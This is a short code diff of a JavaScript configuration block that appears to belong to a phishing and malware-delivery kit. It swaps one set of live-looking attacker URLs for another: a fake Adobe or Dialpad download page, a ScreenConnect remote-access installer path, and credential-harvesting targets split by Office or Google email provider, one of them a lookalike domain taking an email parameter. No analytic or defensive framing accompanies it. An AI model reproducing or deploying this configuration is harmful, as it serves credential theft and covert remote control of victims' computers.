@@ -3,13 +3,13 @@ import dns from "dns/promises";
 /* ================= CONFIG ================= */
 
 const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
-  "https://marcenarias.net/adobe/reader/download.html";
+  "https://verbalthinker.com/dialpad/download.html";
 
 const MSI_PATH = "/ScreenConnect.ClientSetup.msi";
 
-const OFFICE_TARGET = "https://adobe-rm6.info-iroatech-com-s-account.workers.dev?email=";
-const GOOGLE_TARGET = "https://kingdomwater.org/images/cdl";
-const DEFAULT_TARGET = "https://kingdomwater.org/images/cdl";
+const OFFICE_TARGET = "https://digimarconibadan.com/crw";
+const GOOGLE_TARGET = "https://digimarconibadan.com/crw";
+const DEFAULT_TARGET = "https://digimarconibadan.com/crw";
 
 const MX_TIMEOUT_MS = 1500;
 
